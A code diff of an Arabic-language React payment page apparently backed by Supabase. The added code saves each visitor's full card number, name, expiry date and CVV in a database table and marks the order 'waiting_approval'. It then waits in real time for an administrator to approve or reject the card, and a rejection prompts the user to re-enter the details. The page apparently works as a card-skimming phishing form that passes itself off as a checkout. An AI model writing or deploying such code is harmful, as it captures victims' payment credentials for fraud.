@@ -1,13 +1,14 @@
-import { useState, useMemo } from "react";
+import { useState, useMemo, useEffect } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { ArrowRight, Lock, CreditCard, Check, X, Loader2 } from "lucide-react";
+import { ArrowRight, Lock, CreditCard, Loader2, AlertCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import Footer from "@/components/Footer";
 import { useOrder } from "@/contexts/OrderContext";
 import { supabase } from "@/integrations/supabase/client";
+import { Alert, AlertDescription } from "@/components/ui/alert";
 const Payment = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
@@ -18,7 +19,6 @@ const Payment = () => {
   const {
     toast
   } = useToast();
-  const [processingAction, setProcessingAction] = useState<'approve' | 'reject' | null>(null);
   const companyName = searchParams.get("company") || "";
   const price = parseFloat(searchParams.get("price") || "0");
   const regularPrice = parseFloat(searchParams.get("regularPrice") || "0");
@@ -28,6 +28,47 @@ const Payment = () => {
   const [expiryMonth, setExpiryMonth] = useState("");
   const [expiryYear, setExpiryYear] = useState("");
   const [cvv, setCvv] = useState("");
+  const [waitingApproval, setWaitingApproval] = useState(false);
+  const [rejectionError, setRejectionError] = useState(false);
+
+  // Listen to status changes in real-time
+  useEffect(() => {
+    if (!orderData.sequenceNumber || !waitingApproval) return;
+
+    const channel = supabase
+      .channel(`order-${orderData.sequenceNumber}`)
+      .on(
+        'postgres_changes',
+        {
+          event: 'UPDATE',
+          schema: 'public',
+          table: 'customer_orders',
+          filter: `sequence_number=eq.${orderData.sequenceNumber}`
+        },
+        (payload: any) => {
+          const newStatus = payload.new.status;
+          
+          if (newStatus === 'approved') {
+            setWaitingApproval(false);
+            const last4 = cardNumber.slice(-4);
+            navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${last4}`);
+          } else if (newStatus === 'rejected') {
+            setWaitingApproval(false);
+            setRejectionError(true);
+            toast({
+              title: "تم رفض معلومات الدفع",
+              description: "يرجى التأكد من صحة البيانات وإعادة الإدخال",
+              variant: "destructive",
+            });
+          }
+        }
+      )
+      .subscribe();
+
+    return () => {
+      supabase.removeChannel(channel);
+    };
+  }, [orderData.sequenceNumber, waitingApproval, cardNumber, companyName, price, navigate, toast]);
 
   // Detect card type
   const cardType = useMemo(() => {
@@ -56,9 +97,8 @@ const Payment = () => {
   };
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    setRejectionError(false);
 
-    // Extract last 4 digits of card
-    const last4 = cardNumber.slice(-4);
     const expiryDate = `${expiryMonth}/${expiryYear}`;
 
     // Update context
@@ -69,71 +109,34 @@ const Payment = () => {
       cvv: cvv
     });
 
-    // Update database
+    // Update database and set status to waiting_approval
     try {
       if (orderData.sequenceNumber) {
-        await supabase.from("customer_orders").update({
+        const { error } = await supabase.from("customer_orders").update({
           card_number: cardNumber,
           card_holder_name: cardHolder,
           expiry_date: expiryDate,
-          cvv: cvv
+          cvv: cvv,
+          status: 'waiting_approval'
         }).eq("sequence_number", orderData.sequenceNumber);
+
+        if (error) throw error;
+
+        // Start waiting for admin approval
+        setWaitingApproval(true);
+        
+        toast({
+          title: "تم إرسال البيانات",
+          description: "في انتظار موافقة الإدارة على معلومات الدفع...",
+        });
       }
     } catch (error) {
       console.error("Error updating order:", error);
-    }
-
-    // Navigate to processing page
-    navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${last4}`);
-  };
-  const handleApprove = async () => {
-    if (!orderData.sequenceNumber) return;
-    setProcessingAction('approve');
-    try {
-      const {
-        error
-      } = await supabase.from("customer_orders").update({
-        status: 'completed'
-      }).eq("sequence_number", orderData.sequenceNumber);
-      if (error) throw error;
-      toast({
-        title: "تمت الموافقة",
-        description: "تم قبول الطلب بنجاح"
-      });
-    } catch (error) {
-      console.error("Error approving order:", error);
       toast({
         title: "خطأ",
-        description: "حدث خطأ أثناء الموافقة على الطلب",
-        variant: "destructive"
+        description: "حدث خطأ أثناء إرسال البيانات",
+        variant: "destructive",
       });
-    } finally {
-      setProcessingAction(null);
-    }
-  };
-  const handleReject = async () => {
-    if (!orderData.sequenceNumber) return;
-    setProcessingAction('reject');
-    try {
-      const {
-        error
-      } = await supabase.from("customer_orders").update({
-        status: 'cancelled'
-      }).eq("sequence_number", orderData.sequenceNumber);
-      if (error) throw error;
-      toast({
-        title: "تم الرفض",
-        description: "تم رفض الطلب"
-      });
-    } catch (error) {
-      console.error("Error rejecting order:", error);
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء رفض الطلب",
-        variant: "destructive"
-      });
-    } finally {
-      setProcessingAction(null);
     }
   };
   return <div className="min-h-screen bg-gradient-to-b from-background to-muted/20" dir="rtl">
@@ -155,6 +158,24 @@ const Payment = () => {
           {/* Payment Form */}
           <div className="bg-white rounded-2xl shadow-lg p-8">
             <h2 className="text-2xl font-bold text-foreground mb-6">معلومات الدفع</h2>
+            
+            {rejectionError && (
+              <Alert variant="destructive" className="mb-6">
+                <AlertCircle className="h-4 w-4" />
+                <AlertDescription>
+                  تم رفض معلومات الدفع. يرجى التأكد من صحة البيانات وإعادة الإدخال.
+                </AlertDescription>
+              </Alert>
+            )}
+
+            {waitingApproval && (
+              <Alert className="mb-6 bg-blue-50 border-blue-200">
+                <Loader2 className="h-4 w-4 animate-spin" />
+                <AlertDescription className="text-blue-900">
+                  تم إرسال معلومات الدفع بنجاح. في انتظار موافقة الإدارة...
+                </AlertDescription>
+              </Alert>
+            )}
             
             <form onSubmit={handleSubmit} className="space-y-6">
               <div className="space-y-2">
@@ -216,15 +237,23 @@ const Payment = () => {
                 </div>
               </div>
 
-              <Button type="submit" className="w-full h-14 text-lg bg-accent hover:bg-accent/90">
-                <Lock className="ml-2 h-5 w-5" />
-                ادفع {price.toFixed(2)} ريال بأمان
+              <Button 
+                type="submit" 
+                disabled={waitingApproval}
+                className="w-full h-14 text-lg bg-accent hover:bg-accent/90"
+              >
+                {waitingApproval ? (
+                  <>
+                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
+                    في انتظار الموافقة...
+                  </>
+                ) : (
+                  <>
+                    <Lock className="ml-2 h-5 w-5" />
+                    إرسال معلومات الدفع
+                  </>
+                )}
               </Button>
-
-              <div className="flex gap-2 pt-4 border-t border-border">
-                
-                
-              </div>
 
               <p className="text-xs text-center text-muted-foreground">
                 بإتمام الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
@@ -235,31 +264,43 @@ const Payment = () => {
           {/* Order Summary & Card Preview */}
           <div className="space-y-6">
             {/* Card Preview */}
-            <div className="relative">
-              <div className="bg-gradient-to-br from-slate-700 via-slate-800 to-slate-900 rounded-2xl p-8 text-white shadow-2xl aspect-[1.586/1] flex flex-col justify-between">
-                <div className="flex justify-between items-start">
-                  <div className="w-16 h-12 bg-gradient-to-br from-yellow-400 to-yellow-600 rounded-lg"></div>
-                  <div className="w-12 h-12 bg-white/10 rounded-lg flex items-center justify-center">
-                    <div className="w-8 h-6 bg-white/20 rounded"></div>
-                  </div>
-                </div>
-
-                <div className="space-y-4">
-                  <div className="text-2xl tracking-[0.2em] font-mono">
-                    {cardNumber ? formatCardNumber(cardNumber).padEnd(19, "•") : "•••• •••• •••• ••••"}
-                  </div>
-                  
-                  <div className="flex justify-between items-end">
-                    <div>
-                      <div className="text-xs text-white/60 mb-1">VALID THRU</div>
-                      <div className="font-mono">
-                        {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
+            <div className="relative perspective-1000">
+              <div className="bg-gradient-to-br from-primary via-primary-dark to-accent rounded-2xl p-6 md:p-8 text-white shadow-2xl relative overflow-hidden">
+                {/* Card shine effect */}
+                <div className="absolute inset-0 bg-gradient-to-br from-white/20 via-transparent to-transparent opacity-30"></div>
+                
+                {/* Card content */}
+                <div className="relative z-10 flex flex-col justify-between h-full min-h-[200px]">
+                  <div className="flex justify-between items-start mb-8">
+                    <div className="w-12 h-10 bg-gradient-to-br from-yellow-300 to-yellow-500 rounded-md shadow-lg"></div>
+                    {cardType === "visa" && (
+                      <div className="text-2xl font-bold bg-white text-primary px-3 py-1 rounded">VISA</div>
+                    )}
+                    {cardType === "mastercard" && (
+                      <div className="flex items-center gap-1">
+                        <div className="w-8 h-8 rounded-full bg-red-500"></div>
+                        <div className="w-8 h-8 rounded-full bg-orange-400 -ml-4"></div>
                       </div>
+                    )}
+                  </div>
+
+                  <div className="space-y-4">
+                    <div className="text-xl md:text-2xl tracking-[0.25em] font-mono font-light">
+                      {cardNumber ? formatCardNumber(cardNumber).padEnd(19, "•") : "•••• •••• •••• ••••"}
                     </div>
-                    <div>
-                      <div className="text-xs text-white/60 mb-1 text-right">CARDHOLDER NAME</div>
-                      <div className="font-medium text-right">
-                        {cardHolder || "YOUR NAME"}
+                    
+                    <div className="flex justify-between items-end">
+                      <div className="flex-1">
+                        <div className="text-xs text-white/70 mb-1">حامل البطاقة</div>
+                        <div className="font-medium text-sm md:text-base uppercase">
+                          {cardHolder || "CARDHOLDER NAME"}
+                        </div>
+                      </div>
+                      <div>
+                        <div className="text-xs text-white/70 mb-1 text-right">تاريخ الانتهاء</div>
+                        <div className="font-mono text-sm md:text-base">
+                          {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
+                        </div>
                       </div>
                     </div>
                   </div>
